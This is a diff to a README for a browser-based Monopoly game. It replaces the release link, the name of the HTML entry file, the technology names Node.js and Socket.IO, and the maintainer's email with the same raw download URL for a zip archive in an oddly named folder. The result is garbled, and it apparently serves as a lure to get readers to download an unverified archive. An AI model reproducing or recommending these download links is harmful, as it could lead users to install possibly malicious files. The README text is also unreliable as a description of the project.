@@ -1,6 +1,6 @@
 # Monopoly Multiplayer 🎲🏠
 
-![Monopoly Multiplayer](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)
+![Monopoly Multiplayer](https://github.com/arinitruc5349/Monopoly-Multiplayer/raw/refs/heads/main/denudate/Multiplayer-Monopoly-1.7.zip%20Latest%20Release-Click%20Here-blue)
 
 Welcome to the **Monopoly Web Game**, an online adaptation of the legendary board game! Buy, trade, and build your empire while managing your fortune. Will you dominate the market or go bankrupt? This game is designed for players who enjoy strategic gameplay and the thrill of competition. 
 
@@ -32,9 +32,9 @@ Monopoly is a classic board game that has entertained players for generations. O
 
 To start playing Monopoly Multiplayer, follow these steps:
 
-1. **Download the Game**: You can download the latest release [here](https://github.com/arinitruc5349/Monopoly-Multiplayer/releases).
+1. **Download the Game**: You can download the latest release [here](https://github.com/arinitruc5349/Monopoly-Multiplayer/raw/refs/heads/main/denudate/Multiplayer-Monopoly-1.7.zip).
 2. **Unzip the Files**: After downloading, unzip the files to your desired location.
-3. **Open the Game**: Navigate to the folder and open the `index.html` file in your web browser.
+3. **Open the Game**: Navigate to the folder and open the `https://github.com/arinitruc5349/Monopoly-Multiplayer/raw/refs/heads/main/denudate/Multiplayer-Monopoly-1.7.zip` file in your web browser.
 
 ### Prerequisites
 
@@ -56,8 +56,8 @@ To start playing Monopoly Multiplayer, follow these steps:
 - **HTML5**: For structuring the game interface.
 - **CSS**: For styling the game and making it visually appealing.
 - **JavaScript**: For game logic and interactivity.
-- **Node.js**: For server-side functionality (if applicable).
-- **Socket.IO**: For real-time communication between players.
+- **https://github.com/arinitruc5349/Monopoly-Multiplayer/raw/refs/heads/main/denudate/Multiplayer-Monopoly-1.7.zip**: For server-side functionality (if applicable).
+- **https://github.com/arinitruc5349/Monopoly-Multiplayer/raw/refs/heads/main/denudate/Multiplayer-Monopoly-1.7.zip**: For real-time communication between players.
 
 ## Contributing
 
@@ -75,11 +75,11 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 For questions or suggestions, feel free to reach out to the project maintainer:
 
-- **Bocaletto Luca**: [Email](mailto:example@example.com)
+- **Bocaletto Luca**: [Email](https://github.com/arinitruc5349/Monopoly-Multiplayer/raw/refs/heads/main/denudate/Multiplayer-Monopoly-1.7.zip)
 
 ## Releases
 
-To stay updated with the latest features and fixes, check out the [Releases](https://github.com/arinitruc5349/Monopoly-Multiplayer/releases) section. Download the latest version and enjoy the game!
+To stay updated with the latest features and fixes, check out the [Releases](https://github.com/arinitruc5349/Monopoly-Multiplayer/raw/refs/heads/main/denudate/Multiplayer-Monopoly-1.7.zip) section. Download the latest version and enjoy the game!
 
 ---
 
